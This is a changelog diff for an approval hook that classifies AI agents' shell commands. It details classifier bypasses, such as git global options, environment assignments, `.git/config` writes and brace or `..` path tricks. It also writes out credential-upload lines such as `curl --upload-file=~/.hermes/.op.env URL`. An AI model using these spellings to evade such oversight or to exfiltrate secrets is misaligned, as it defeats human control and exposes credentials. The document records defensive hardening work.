@@ -17,12 +17,231 @@ before a tag.
 
 ### Security
 
-**A hole in 0.4.5 that this closes.** A `git push` that deleted a remote
-branch classified as a plain push when the delete flag was bundled or
-abbreviated, so `vcs.ref.delete` was never asked. Under this repository's
-policy that made `git push -ud origin lane` autonomous and `git push --del
-origin main` supervised-retro (it proceeds). Upgrade every install that relies
-on the hook for enforcement.
+**Two more push holes in 0.4.5, closed here (APRV-518).** `git remote add
+--mirror=push m <url>` classified `read.vcs.remote` (autonomous), and the
+`git push m` after it read as an implicit `vcs.push.main` while it was a
+mirror push that deleted remote branches: a two-step way around
+`vcs.ref.delete` and `vcs.history.rewrite`. And `git push origin HEAD` (or `@`)
+was `vcs.push.branch` even on main.
+
+- **Writing `git remote` is `vcs.history.rewrite` (rule `git-remote-write`).**
+  Only a closed list still reads: `git remote`, `-v` / `--verbose`, `show
+  [-n]`, `get-url [--push] [--all]`, and `update` without `--prune`. `add`
+  (any `--mirror`), `rename`, `remove` / `rm`, `set-url`, `set-head`,
+  `set-branches`, `prune`, `update --prune`, an unknown subcommand and an
+  expandable subcommand word take the class of the mirror push they can arm.
+  `git config remote.…` writes were already refused as `unclassified` and stay
+  so; `git -c remote.…=… push` stays refused.
+- **The hook reads the checkout before it answers a push.** A new impure pass
+  (`src/cli/push-repo.ts`, first in `classifyForHook`) reads the current
+  branch, `remote.*.mirror`, `remote.*.push`, local tags, `push.followTags` and
+  submodule recursion in every directory the push may run in (the hook's own
+  and each literal `cd` before it), and answers each `git push` segment again,
+  the strictest reading winning. A push to a mirror remote is
+  `vcs.history.rewrite`; a refspec-less or colon-less push takes the class of
+  the configured refspecs (`+refs/heads/lane:refs/heads/main` makes `git push
+  origin lane` a forced trunk update, so `vcs.history.rewrite`); a colon-less
+  word naming a local tag, or `push.followTags`, is `release.publish`. When the
+  checkout cannot be read, or a `cd` cannot be followed (`cd "$D"`, `cd -`), a
+  push whose configuration decides its refs is `vcs.history.rewrite` (rule
+  `git-push-config-unreadable`).
+- **A write into a `.git` directory is `vcs.history.rewrite` (rule
+  `git-dir-write`).** `printf '[remote "origin"]\n\tpush =
+  :refs/heads/lane\n' >> .git/config && git push origin` deleted `lane` while
+  it read as a workspace write and an implicit trunk push. A redirection,
+  `tee`, `cp`, `mv`, `sed -i`, `rm`, `ln`, `curl -o` or `wget -O` whose target
+  has a `.git` segment now takes the class of the push it can arm. Reads are
+  unmoved. Writes to `~/.gitconfig`, `~/.config/git/` and `/etc/gitconfig`
+  take the class too (rule `git-config-file-write`), and a bare `GIT_*=` or
+  `XDG_CONFIG_HOME=` assignment is refused (APRV-521's rule in 0.4.6, which
+  still admits its harmless words such as `GIT_PAGER=cat`).
+- **The hook trusts its reading of the checkout only when nothing else on the
+  line can change it.** Any non-read segment before the push (`git checkout
+  main && git push origin HEAD`, `npm test && git push -u origin lane`), or
+  any non-read segment running alongside it (`|`, `&`), makes the push
+  unreadable: `vcs.history.rewrite` when its configuration decides its refs,
+  at least `release.publish` when its refs are on the line (`push.followTags`
+  may be on by then). Push in its own call to keep the real answer.
+- **Push destinations are read through git's ref DWIM.** `git push origin
+  lane:heads/main` moved the remote trunk and read as `vcs.push.branch`.
+  `heads/x` is `refs/heads/x`, case is ignored (`MAIN`), `tags/x` is a tag,
+  and the hook adds the branch `origin/HEAD` names to main and master.
+- **`HEAD` and `@` are the current branch.** The pure classifier reads a
+  colon-less `HEAD` / `@` (any case: `head` resolves on a case-insensitive
+  filesystem) as the trunk push, rule `git-push-head`. The hook resolves it:
+  main, master, the `origin/HEAD` branch or a detached HEAD stay
+  `vcs.push.main`; any other branch is `vcs.push.branch`, the answer it had.
+- **Every verdict that moved, moved stricter.** Against #649's head, 0 looser
+  under the class order and under this repository's APPROVAL.md: over 24,696
+  pure command lines (4,528 `git push`, 2,344 `git remote` and 20
+  configuration-write lines stricter), and over 3,735 hook-level command lines
+  in nine checkout states (1,147 stricter). Real-git tests on a bare local remote prove each
+  case's effect. Conformance: `command-class` 1.10.0, twelve new vectors; no
+  existing expectation moved.
+
+## 0.4.6 — 2026-10-18
+
+0.4.6 carries everything merged since 0.4.5. It closes the classifier holes
+listed under "Holes in 0.4.5" below (git push delete spellings, git globals
+that take a value, environment assignments in front of git, credential reads
+in six spellings, quoted assignment names, and writes into the Hermes home's
+other organs), and every verdict those changes move, moves stricter. It adds
+`exec.code`, a custody-gated class for opaque agent code. `exec.code` is opt-in
+and off by default: a policy that never names `exec.code` keeps every refusal
+byte for byte, and nothing new blocks an agent's code runs. And it puts the
+Telegram reminder, stale summary, digest, `/queue` and card headings in plain
+words. Upgrade every install that relies on the hook for enforcement, in the
+order under "Upgrade order" at the end of this section. **Rollout note:** a
+core older than 0.4.6 refuses the `exec` key and fails the whole policy closed,
+so a policy gains an `exec` block only after every core that reads it runs
+0.4.6.
+
+### Added
+
+- **`exec.code`, a custody-gated class for opaque agent code (APRV-510).**
+  `python3 -c`, `python -c`, `node -e`/`--eval`, `bun -e`/`--eval`,
+  `deno eval`, `perl -e`/`-E`, `ruby -e`, and `python`/`python3`/`bun` running a
+  file that is not a skill script were refused before policy on every harness, and
+  Hermes `execute_code` with them. A new policy block opens them key by key:
+  `exec.code.custody: attested` (the operator's statement that credential custody
+  is in place) classifies the shell forms `exec.code`, resolved like any class;
+  `exec.code.execute_code: hooked` beside it opens Hermes `execute_code`. A record
+  binds the program's SHA-256 and length and the command line's SHA-256, never the
+  program text, and says the program existed rather than what it did. A policy
+  that never names `exec.code` keeps every refusal byte for byte; one that names it
+  without custody refuses the new `hook-exec-code-custody-unattested`; a file
+  program the hook cannot read, or cannot place by the kernel's reading (a path
+with `..`, a symlinked directory, a program that is not the line's sole segment,
+no stated working directory), refuses the new `hook-exec-code-unreadable`. `bash
+  -c`, `sh -c`, `eval`, pipes into an interpreter, stdin and a program inside a
+subshell stay refused, the open
+  window does not reach the class, and Codex stays closed. **Rollout order:** a
+  core without this release refuses the `exec` key and fails the whole policy
+  closed, so a tenant gets the block only after its pinned core carries it. New
+  conformance suite `hook-exec-code` 1.0.0; `refusal-unions` 29.0.0;
+  `schema-validation` 3.4.0. SPEC.md §5.2, §7 and §11.2 amended, pending sign-off.
+
+### Security
+
+**Holes in 0.4.5 that this release closes.** Each one let a command run below
+the class it should have had. Upgrade every install that relies on the hook
+for enforcement.
+
+- A `git push` that deleted a remote branch classified as a plain push when
+  the delete flag was bundled or abbreviated, so `vcs.ref.delete` was never
+  asked. Under this repository's policy that made `git push -ud origin lane`
+  autonomous and `git push --del origin main` supervised-retro (it proceeds)
+  (APRV-517).
+- A git global option that takes a value made its value the subcommand, so
+  `git -C status push --force origin main` was `read.shell` (APRV-520).
+- An environment assignment in front of git hid the program git runs, so
+  `GIT_PAGER=<cmd> git log` ran `<cmd>` as `read.shell` (APRV-521).
+- Six classes of spelling read a credential file below `account.credential`,
+  git's reading verbs among them (APRV-522).
+- An assignment-shaped word with a quoted or escaped name was read past as an
+  assignment, so the classifier judged a different program from the one bash
+  runs (APRV-523).
+- On an Agent Village box a write into `$HERMES_HOME/hermes-agent/`,
+  `$HERMES_HOME/plugins/` or onto `$HERMES_HOME/.op.env` was
+  `files.write.workspace`, autonomous under the village template (APRV-511,
+  under "The Hermes home's other organs" below).
+
+APRV-524 closes a gap that APRV-511's substitution sentinel opened on main
+after 0.4.5; no release carried it. The entries below give the detail.
+
+- **A credential read whose last path component is a command substitution is
+  `account.credential` on every adapter (APRV-524).** Since APRV-511 a
+  substitution stays in its word as an unexpanded sentinel, and the credential
+  pass that every adapter runs judged such a word by its text alone, so a git
+  reader (show, a no-index diff or grep, a patch log) of a Hermes credential
+  file named through a substitution was an autonomous read on Claude Code,
+  Cursor, Grok, the Codex bridge and Muse without a per-call directory, where
+  the release before APRV-511 refused it. Only Hermes, and Muse with a
+  `workdir`, judged the word again. The credential pass, which every adapter
+  runs, now judges it too: an unresolved read word is a credential read when
+  its text could name one, when its literal prefix lands somewhere that makes
+  it one, or when its last component is the unresolved one under a home, a
+  profile home, the install's directory, an approval home or any directory
+  that holds credentials. A word holding a substitution is also judged with
+  the substitution empty, as the release before APRV-511 read it, so a
+  recursive reader (git, `grep -r`, rg, tar, a directory copy) of a
+  substitution in a middle component, glued to a credential directory's name,
+  or after a glob that matches one on disk is refused again as well. The same
+  judgement covers a home spelled as a variable the hook process does not
+  have set, which before APRV-511 a git reader also could not pass. It only
+  adds the class. A single-file read of such a word now answers the same on
+  every adapter, as it already did on Hermes; Hermes and Muse with a `workdir`
+  still also refuse every recursive read of an unresolved word, which the
+  other adapters do not. Ordinary directories are unaffected.
+- **Credential reads are judged on every path (APRV-522).** Six classes of
+  spelling let a command read a credential file below `account.credential`,
+  on 0.4.5 and older (the APRV-639 credential-asymmetry refutation). (M2) git
+  was exempt from the credential rule as a write-only binary, so its reading
+  verbs (diff and grep without an index, log and show with a patch or a
+  `<rev>:<path>`) printed the file as `read.shell`; now only the path-writing
+  verbs keep the exemption, and only when the verb is read past the globals
+  and every option is on that verb's closed allow-list (an abbreviated long
+  option, a bundled short flag or an unknown flag makes git a reader). (M3) The
+  credential rows now resolve `..`, `.` and `//` and fold case, in the shell and
+  in the read tools; a `..` spelling through the log directory keeps
+  `log.mutate`. (M4) The Claude Code hook and `hook classify` gain the disk pass
+  the Hermes hook had: every path a segment reads is landed through earlier
+  `cd`s, symlinks (lexical and physical `..`), globs, brace lists, `~`,
+  `$HOME`, `$HERMES_HOME`, `$PWD` and `${VAR:-default}`, inside every `$(…)`
+  and inside the script of every login-shell wrapper the classifier unwraps,
+  and judged by the credential rule (`credential-path-resolved`). A directory
+  handed to a recursive reader (the grep family, `rg`, `ag`, `ack`, `find`,
+  `tar`, `zip`, `du`, `tree`, a directory copier, and now git and `diff`) is
+  judged as a directory read; a recursive search (`tar` and `zip` aside) and
+  `git grep` also read the working directory, whether or not they name a path;
+  a one-operand link or copy reads its only operand. In the Claude Code arm
+  the pass judges from the hook process's directory and from the envelope's
+  `cwd`. (M5) The same pass judges a reader whose segment also writes, and a
+  reader inside `$(…)`, which the Hermes pass skipped. (M6) A file named inside
+  a reader's own option (`--name=FILE`, an attached short value, curl's `@FILE`
+  forms) is judged as a read. (S2) A `<` target, and a read inside `$(…)`, take
+  the read scope a positional target takes. No credential location was added.
+
+  Where the hook cannot know where a read lands, the read is
+  `account.credential` (fail closed). After a `cd` it cannot resolve, every
+  later relative read is a credential read, an unexpandable `$` in the word
+  included. A `cd` is unresolvable when its operand is a variable, `-`, a glob,
+  a brace list or an unexpanded tilde prefix; when it carries an assignment
+  prefix (`CDPATH=`, `HOME=`, any other); when it carries an option other than
+  `-L`, `-P`, `-e`, `-q` or `-s`, two or more operands (zsh's substitution
+  form), or an operand that is empty or opens with `-` or `+` (zsh's stack
+  forms, and `cd -- -x`, which was read as a bare `cd`). `popd` is always
+  unresolvable. A relative operand that does not open with `./` or `../` may
+  be found through a `CDPATH` the hook cannot see; the hook then also judges
+  each later relative word as `<unknown directory>/<operand>/<word>`, and it is
+  a credential read only when that path could name credential material or a
+  gate home: the operand carries a credential name (`keys`, `vault*`, `env*`,
+  `.env*`, `auth.json`), the joined path matches a credential row with the
+  unknown directory taken as a home, the word reaches `.env*` or `auth.json`
+  directly below the operand's directory (which may be a profile home of any
+  name), or the path ends in `.approval`, `.hermes`, the configured Hermes
+  home's name or `profiles/<name>`. **The remaining cost of that rule:** after
+  such a `cd`, a recursive reader (the grep family, `rg`, `find`, `tar`, a
+  copier such as `cp`, git or `diff` with a path or message word), a word
+  holding `..` and a `**` glob are credential reads. `cd src && npm test` keeps
+  its normal class. `$OLDPWD` and the directory stack (`$DIRSTACK`,
+  `$dirstack`) fail closed as `~-` does; a logical `cd ..` is judged against
+  the directory as spelled as well as its symlink's target; a recursive `**`
+  glob judges the directory it starts from; and a backslash, a separator only
+  on Windows, is no longer split on in the kernel's reading. A word opening
+  with `~+`, `~-` or `~name`, a brace list past 64 words, nesting of `$(…)` or
+  shell scripts past 8 levels, and a known shell handed an inline script in a
+  shape the classifier does not unwrap are credential reads too.
+
+  Still out of reach, stated so nobody assumes otherwise: a path held in a
+  variable, or produced by a substitution's output, is judged by its text alone
+  (an absolute one always, a relative one unless the directory is unknown); a
+  recursive search of an ANCESTOR of a credential directory; a Claude Code
+  Bash directory that is neither the hook process's nor the envelope's `cwd`;
+  in the Hermes hook's WRITE judgement, a relative `cd` steered by an inherited
+  `CDPATH` (its reads are judged as above); after such a `cd`, a symlink inside
+  the unknown directory, a `CDPATH` entry that itself lies inside a credential
+  subtree, and a user's `cdable_vars` option or a `cd` function from a profile.
 
 - **`git push` is read through git 2.50's own option grammar (APRV-517).** The
   `git-push` row matched flags by exact spelling (`--delete`, `-d`, `--force`,
@@ -62,6 +281,147 @@ on the hook for enforcement.
   strictly.
 - Conformance: `command-class` 1.8.0, twelve new `push-*` vectors; no existing
   expectation moved.
+- **A git global option that takes a value no longer moves the subcommand
+  (APRV-520).** The classifier reads a git subcommand as the first positional
+  after `git`. A global option that consumes the next word (`-C <path>`, `-c
+  <name>=<value>`, `--config-env`, `--git-dir`, `--work-tree`, `--namespace`,
+  `--super-prefix`, `--attr-source`, `--shallow-file`) made that first
+  positional the option's value. So `git -C status push --force origin main`, a
+  force push, classified `read.shell` and ran unattended, and `git -C commit
+  reset --hard` classified as a plain commit. This is on 0.4.5. Now every
+  value-taking global, in its separate or `=`-joined spelling
+  (`--exec-path=<path>` included), leaves the segment `unclassified`, and the
+  hook refuses it. So does any flag in global position that the classifier does
+  not know (`-Cdir`, `--`, `-$X`). The zero-value globals (`--no-pager`, `-p`,
+  `-P`, `--bare`, `--no-optional-locks` and the rest of git 2.50's table) are
+  skipped as before. Options after the subcommand are unchanged (`git commit -C
+  HEAD`, `git grep -C 3`). Stricter only: a differential against main's
+  classifier (98d12562) over 2,150,475 generated git lines moved 997,840 from an
+  answer to `unclassified` and loosened or reclassified none. Cost: `git
+  --git-dir=.git status` and the other `=`-joined spellings, which used to
+  classify as their subcommand, now need `cd` or a person.
+- **An environment assignment in front of git no longer hides what git runs
+  (APRV-521).** The classifier skipped every `NAME=value` word in front of the
+  binary and classified `git` by its subcommand alone. Most of git(1)'s
+  ENVIRONMENT section runs a program (`GIT_PAGER`, `GIT_EDITOR`,
+  `GIT_SEQUENCE_EDITOR`, `GIT_SSH`, `GIT_SSH_COMMAND`, `GIT_ASKPASS`,
+  `GIT_EXTERNAL_DIFF`), repoints the repository (`GIT_DIR`, `GIT_WORK_TREE`,
+  `GIT_INDEX_FILE`, `GIT_OBJECT_DIRECTORY`, `GIT_NAMESPACE`, ...), redirects the
+  configuration (`GIT_CONFIG_GLOBAL`, `GIT_CONFIG_COUNT` with
+  `GIT_CONFIG_KEY_<n>`/`GIT_CONFIG_VALUE_<n>`, `GIT_CONFIG_PARAMETERS`, `HOME`,
+  `XDG_CONFIG_HOME`), moves the helper directory (`GIT_EXEC_PATH`) or writes a
+  file (`GIT_TRACE*=<path>`). So `GIT_PAGER=<cmd> git log` ran `<cmd>` as an
+  autonomous `read.shell`. This is on 0.4.5. Now a git segment with any
+  assignment in front of it is `unclassified`, and the hook refuses it, unless
+  every assignment is on a closed list that can only remove a program or swap
+  it for a no-op: `GIT_TERMINAL_PROMPT=0`, `GIT_PAGER=cat`, `PAGER=cat`,
+  `GIT_EDITOR=true`, `GIT_EDITOR=:`, `EDITOR=true`, `EDITOR=:`, `VISUAL=true`,
+  `VISUAL=:` (exact words), and `LANG`, `LC_*` or `TZ` with a plain locale or
+  zone name. A variable git or the programs it starts read, set by the line's
+  own shell (a bare `GIT_PAGER=x;`, `export`, `declare -x`, `printf -v`,
+  `${NAME:=x}`), makes every git segment on the line `unclassified` too, and a
+  bare assignment of one is refused on its own as the bare `PATH=` already
+  was. `env`, `exec`, `command` and the other wrappers were already refused and
+  still are. Stricter only: a differential against #651's head (f62dd57e) over
+  21,868,560 generated lines moved 18,534,298 from an answer to `unclassified`
+  and loosened or reclassified none. Cost: `FOO=1 git ...` and any other
+  assignment off the list now needs a person.
+  The assignment is read in every spelling bash accepts (review-b M1). The
+  append operator (`NAME+=value`) and a subscripted name (`NAME[i]=value`,
+  `NAME[i]+=value`) used to stop the classifier's cursor, which took the word
+  for the program and judged the real one as its argument; this was on 0.4.5
+  too. Either spelling now leaves the segment `unclassified`, in front of git,
+  in front of any other program, and on its own. A command word that opens
+  like a subscripted assignment the tokenizer cannot read in full is refused
+  the same way, and the compound array form (`NAME=(…)`) is `unparseable`. The
+  line scan reads the same spellings, a subscripted `${NAME[i]:=x}`, and two
+  more names (`GCONV_PATH`, `GNUPGHOME`). Stricter only: a depth-2 differential
+  against main (2179e128), with those spellings added to its alphabet, moved
+  272,300 of 1,533,105 generated lines to a refusal and loosened or
+  reclassified none. Cost: `n+=1` and other append or array writes now need
+  a person.
+- **An assignment-shaped word whose name is quoted or escaped is the command
+  bash runs (APRV-523).** bash decides whether a word in front of a command is
+  an assignment on the word as written: the name, the `+` and the `=` must
+  carry no quote or backslash, and the name no `$`, backtick or brace. A word
+  that fails that test is the program bash runs, named by the whole word, and
+  the next word is its first argument. The classifier applied the same grammar
+  to the word after quote removal, so it read past such a word as an
+  assignment and judged the next word as the program; the two disagreed about
+  what runs. This was on main and 0.4.5, in front of every program, git
+  included, and with every assignment spelling. The grammar is now read on
+  the source spelling. A segment where the classifier's reading and bash's
+  stop at different words is `unclassified` (the hook refuses it), on its own,
+  after a real assignment, and inside a substitution; a protected redirect
+  still answers first, as for the plain spelling. One path ran before that
+  check (review-b S1). A login-shell wrapper, exactly a shell, an
+  inline-script flag and a script, was unwrapped and answered with the
+  script's class whenever the first word's last path segment named a shell.
+  That held for an assignment-shaped first word with a quoted or escaped name
+  and for a relative path, so the script's class was given to a program the
+  agent can place. A word whose slash came from a parameter expansion, with a
+  literal backslash before the shell name, took the same route (review-b
+  S1-R): the classifier read the backslash as a path separator and saw no
+  slash, while bash ran a path. The wrapper is now unwrapped only when its
+  shell word is the system's, named as written: a bare name, or a path in
+  `/bin`, `/usr/bin`, `/usr/local/bin`, `/sbin` or `/usr/sbin`, with no
+  assignment shape, no backslash, and nothing the shell would still expand.
+  Every other shell word keeps the wrapper opaque or `unclassified`. The
+  same written-as-run test now gates the date, hostname and other shape rows
+  (APRV-508), whose binary had the same backslash reading. The segment shapes the hook,
+  the approval breakdown and the channels read now name the word bash runs as
+  the binary. A quoted value, or a quoted subscript, keeps the word an
+  assignment, unchanged. Stricter only: a depth-2 differential over
+  2,421,383 generated lines (#652's git corpus, with the quoted and escaped
+  spellings added to its alphabet, and a corpus of other programs) moved
+  51,226 from an answer to `unclassified` against #652's head (3a9c33c3) and
+  586,454 against main (2179e128, #652's moves included), and loosened or
+  reclassified none. With login-shell wrappers, the backslash and expansion
+  spellings, and shape-row binaries added to that corpus (2,423,915 lines),
+  it moved 52,712 against main after #653 (7ab156eb), 1,242 against this
+  change before the wrapper rule (e0cb9923, measured before the backslash
+  rows were added) and 244 against the first wrapper rule (d6752ded), and
+  loosened or reclassified none. Cost: none expected for the quoted name; an
+  agent has no reason to quote the name of an assignment. A shell spelled by
+  any other path (a relative one, or a Homebrew shell under `/opt`), or by a
+  word with an expansion or a backslash in it, is no longer unwrapped, and
+  its inline script needs a person; a shape-row binary spelled that way is
+  `unclassified`.
+
+### Changed
+
+- **Telegram reminders, summaries, digests and `/queue` speak plainly (P-9).**
+  A restart with stale requests now sends one reminder instead of two: the stale
+  summary opens with the count of everything the restart re-sends and says
+  whether older buttons still work, and the separate banner is skipped. The
+  stale summary, the digest and `/queue` name each request by the agent's own
+  summary and its age (or the agent's cost estimate), under "What your agent
+  says (not checked)", and no longer show action keys, task ids, class tallies,
+  grouping keys or text about hooks, retry grace and log events. The paced
+  opening is a reminder that says whether older buttons still work, which
+  matters behind a relay where they do not. The request card's headings read
+  "Checked by approval.md", "Exactly what you are approving" and "What your
+  agent says (not checked)", and the author id in that label (and in each
+  claimed row's tag) is one line of at most 80 characters, so an id with a line
+  break cannot draw a second heading. The card's action-key row and its canonical payload
+  block are unchanged, the first because it is a required row and the second
+  because `display_hash` binds it (SPEC.md §10.3), and so are decisions,
+  buttons, grouping, pacing and retries. `/queue`'s header now names the oldest
+  request correctly when the list is shown newest first.
+
+### Channels and identity
+
+- **The Telegram re-delivery banner speaks plainly.** Under `delivery: burst`,
+  the message in front of a listener's first batch was three lines of system
+  vocabulary (`LISTENER STARTED — re-sending N pending requests.`, a sentence
+  about "live copies" and what still "decides", and one about the log being read
+  on every cycle). It is now one short message: `Reminder: N requests are still
+  waiting for you.` (`1 request is` for one), then `They are repeated below;
+  buttons on older messages above still work, and nothing is answered twice.`
+  by default, or `Use the buttons below; buttons on older messages above no
+  longer work.` on a relayed listener (APRV-456). The line about the log is
+  gone. Still one banner per start, still only before the first batch; what is
+  pending and what a tap decides are unchanged.
 
 ### Harnesses
 
@@ -88,6 +448,200 @@ on the hook for enforcement.
   unchanged (942 paths), because `judgy/` was never in the `files` list;
   `docs/README-extended.md`, which ships in the package, drops judgy from its
   directory table.
+
+### The Hermes home's other organs (APRV-511)
+
+- **Security: `hermes-agent/`, `plugins/` and `.op.env` are organs.** On an
+  Agent Village box the agent's uid owns the whole Hermes home, and a write
+  under `$HERMES_HOME/hermes-agent/` (the runtime's source install, whose
+  `.env` Hermes loads into the gateway), `$HERMES_HOME/plugins/` (where the
+  gate's own `av-approval` plugin and its `custody_keys.json` load from) or onto
+  `$HERMES_HOME/.op.env` was `files.write.workspace`, autonomous under the
+  village template. Each is now `policy.core`, by every tool (`write_file`,
+  `patch`, redirections, `sed -i`, `tee`, `cp`, `mv`, `rm`, `chmod`); a read of
+  `.op.env` or `hermes-agent/.env` is `account.credential`. Reads of the
+  runtime's source keep their class.
+- **Security: the `hermes` verbs that rewrite an organ are `policy.core`**
+  (rule `hermes-organ-write`): `plugins install|update|remove|enable|disable`,
+  `plugins pack install`, bare `plugins`, `config set|unset|edit|migrate`,
+  `hooks revoke`, `update`, `uninstall`. A help flag keeps the launch class
+  only as a flag of its own, never after `--` or as a possible flag value.
+- **Security: `$HERMES_HOME` is the home without a disk pass.** `approval hook
+  classify`, Claude Code and Cursor read `>> $HERMES_HOME/config.yaml` as a
+  workspace write; the pure classifier now reads `$HERMES_HOME` and
+  `${HERMES_HOME}` as the home, any other variable segment as possibly the
+  home (organ and credential rows only), the home's names without case, and a
+  `..` below the home resolved. The Hermes hook already expanded the variable.
+- **Security: where a write lands.** A file tool's write is judged at its
+  realpath as well as its spelling (a symlink into the home, a `..` out of a
+  directory under it), for every adapter; in the Hermes disk pass a glob into
+  any `policy.core` directory, a pattern naming an organ directory, and a
+  variable the hook cannot expand that decides the directory are `policy.core`.
+- **Security (refuter round 1): one-call spellings the lexer hid.** A `$(…)`
+  in a path word now stands for an unexpanded variable instead of vanishing
+  (`echo x > $(echo ~/.hermes)/plugins/…`, `cat $(echo ~/.hermes)/.env`,
+  `> $(pwd)/../plugins/…`); an unquoted brace group is expanded and judged per
+  word (`tee ~/.hermes/plugin{s,s}/…`, `cat ~/.hermes/.op.en{v,v}`); `curl -o`,
+  `--output`, `-O`, `--output-dir` and `wget -O`, `--output-document`, `-P` and
+  wget's default name are write targets; GNU `cp -t<dir>` names its
+  destination; `ln` and `cp -s`/`cp -l` whose SOURCE is an organ or a
+  credential plant a handle on it and take its class; and under the Hermes
+  hook a side-effecting command run from inside `hermes-agent/`, `plugins/` or
+  another `policy.core` directory (`git pull`, `git apply`, `npm install`,
+  `git clone`), or a `git --work-tree`/`--git-dir` naming one, is
+  `policy.core`. All of these were allowed on 0.4.3 as well. An unmatched
+  brace is literal, as in bash, and a word whose only distance from an organ
+  or a credential is a stray brace is judged as that organ. curl and wget
+  long options match by unique prefix and every short cluster is parsed; a
+  download carrying an option the table does not know, an ambiguous prefix,
+  or a config source (`curl -K`/`--config`, `wget -e`/`--execute`/`--config`)
+  is `policy.core` (rule `fetch-output-unknown`): its output cannot be known.
+  `curl --method PUT` (not a curl option) moves from `network.call` to that
+  class.
+- **Security (refuter recheck): the rest of the spellings.** A brace sequence
+  that collapses to one word (`plugin{s..s}`, `.op.en{v..v}`,
+  `config.yam{l..l}`) is judged as that word in the pure classifier and the
+  Hermes disk pass. The brace expander is iterative and bounded (256 words,
+  1,024 expansions, a linear group scan); a word past either bound is the
+  stricter class instead of a stack overflow (`hook-io`). Every file curl
+  writes by option is a write target: `-o` joined onto `--output-dir`,
+  `-D`/`--dump-header`, `-c`/`--cookie-jar`, `--trace`, `--trace-ascii`,
+  `--libcurl`, `--etag-save`, `--stderr`, `--hsts`, `--alt-svc`, and each
+  `-w '%output{FILE}'`; wget's `-o`, `-a`, `--output-file`. An output whose
+  value is absent, a variable or a substitution (`curl -o "$OUT"`), or a `-w
+  @FILE` format, is `policy.core` (`fetch-output-unknown`). `cp`, `mv`, `ln`
+  and `install` read `-t` anywhere in a short cluster (`-vt<dir>`,
+  `-rt<dir>`) and `--target-directory` by any unique prefix
+  (`--target-dir=`).
+- **Behavior change:** under the Hermes hook, every write whose directory or
+  leading name an unexpandable variable decides is now `policy.core`, which the
+  village template holds human-only, so the agent cannot run it at all:
+  `mkdir -p "$OUT"`, `> "$OUT/x"`, `> "$TMPDIR/x"`, `> /tmp/$NAME.txt` and
+  `> "$f"` from the workspace (recheck 3 had allowed them outside the home's
+  own directories). In every adapter's pure classifier, a variable or
+  substitution path whose rest names an organ or a credential (`$PWD/plugins/x`,
+  `$REPO/config.yaml`, `$GIT_DIR/hooks/pre-commit`, `$DIST/.env`) is
+  `policy.core` (or `account.credential` to read); `cp x
+  $HERMES_HOME/.env` moves from `policy.core` to `account.credential` (the
+  answer `~/.hermes/.env` already had), refused either way. No answer moves to
+  a looser class.
+- **Security (fix round 3, after the second recheck): a symlink then `..`, and
+  the download/copy family closed by rule.** Node's `realpath` cancels `..`
+  before it reads a link, so `ln -s ~/.hermes/skills k && cat k/../.op.env`
+  and `write_file <ws>/p/../plugins/…` were judged beside `k`, not where the
+  kernel lands. The Hermes disk pass and the file tools now also resolve each
+  path component by component as the kernel does, and the stricter answer
+  wins; a `..` out of something an earlier segment of the same command writes,
+  links, moves, deletes or extracts into, or after a program whose file
+  effects the pass does not model, or through `/proc/<pid>/cwd`, is
+  `policy.core` to write and `account.credential` to read. A `curl`, `wget`,
+  `cp`, `mv`, `ln` or `install` argv word the shell may still turn into an
+  option (an unquoted variable or `$(…)`, a variable at a word's head quoted or
+  not, an unquoted glob at its head, a brace group making a word that begins
+  with `-`) makes the write target unknown: `policy.core`
+  (`fetch-output-unknown`, new `copy-target-unknown`) unless it follows `--`.
+  A curl or wget output holding `#<digit>` (curl's URL-glob fill) is unknown
+  too, and `--output-dir` joins onto an absolute `-o`. A brace word over the
+  cap whose every group is plain numbers (`echo {1..300}`, `touch f{1..300}`)
+  is judged by its first word instead of refusing as a credential read; a
+  letter product (`ls {a..z}{a..z}`) keeps the stricter class.
+- **Behavior change (fix round 3):** `cp "$f" bak/`, `mv $tmp out`, `cp *.md
+  docs/`, `curl "$URL"`, `curl -u $U:$P …` and `curl 'https://e/{a,b}' -o
+  'out_#1'` are now `policy.core` in every adapter; `cp -- "$f" bak/`, `cp
+  ./*.md docs/`, `curl -- "$URL"` and a quoted value keep their class. Under the
+  Hermes hook a `..` out of a directory the same command made (`mkdir -p d &&
+  cat d/../x`) is judged as a credential read. Nothing moves looser than 0.4.4.
+- **Rebased over 0.4.4.** A `$(…)` in a word now leaves an unexpanded-variable
+  sentinel, so a `>&` target made only of substitutions (`date >&$(ls)`) is
+  kept at 0.4.4's `unparseable` refusal rather than read as a file; and a
+  `$(…)` glued before a binary's name (`(( $(ls)date ))`, `a=($(ls)rm)`) is
+  part of the command word, so it no longer reads as `date` or `rm` and is
+  refused `unclassified`; and a `$(…)` that decides a `date` assignment's
+  value (`TZ="$(cat .tz)" date`, `LANG=$(cat .l) date`) is refused as `TZ=$X
+  date` always was, since the output could name a zone file. All only ever
+  stricter than 0.4.4.
+- **Security (fix round 4, M(L5f-1)): the file an upload reads, in every
+  spelling.** The file a `curl` or `wget` upload or request-body option reads
+  was judged only when it was a word of its own, so `curl
+  --upload-file=~/.hermes/.op.env URL`, `-T<file>`, `--data=@<file>`,
+  `--data-binary=@<file>`, `wget --post-file=<file>`, `--body-file=<file>` and
+  `--input-file=<file>` sent a credential as `network.call`. The value
+  embedded in the option word (`--opt=value`, `-Tvalue`, `-sd@value`,
+  `-Ff=@value`, wget's options by unique prefix) is now judged as the
+  separated value is, and the file after `@` or `<` is judged on its own in
+  either spelling (`curl -F f=@.hermes/.env`, `--data @.approval/env`, `-F
+  'f=@<file>;type=…'`): a credential file is `account.credential` and an
+  organ its own class. An embedded value whose file the text cannot read (a
+  variable, a substitution, a glob or a brace in it, or a variable where the
+  `@` would be: `--upload-file="$F"`, `--data="$BODY"`) is
+  `account.credential`; the separated `-T "$F"` and `-d "$BODY"` keep
+  `network.call`. A download output that outranks the credential class keeps
+  `policy.core`. Only ever stricter than 8f954b62.
+- **Security (fix round 5, the last): a relative upload source under the
+  Hermes hook.** The hook's disk pass judged operands as reads only for read
+  segments, so `curl -T ../.op.env URL` from the workspace, `curl --data
+  @.op.env URL` or `curl -T plugins/av-approval/_custody.py URL` from the home
+  sent the file as `network.call` while `cat ../.op.env` was refused. Each file
+  an upload or body option reads (`-T`, `-d @`, `-F f=@`, `--data-urlencode
+  name@`, `wget --post-file`/`--body-file`/`-i`) is now judged as the read it
+  is: resolved after `cd` and `~`, through symlinks and `..` by the same
+  landing helpers, a credential `account.credential`, an organ or protected
+  path its class, and a file outside the read scope `read.file.out_of_scope`.
+  Only ever stricter than 84856f9f; the pure classifier is unchanged.
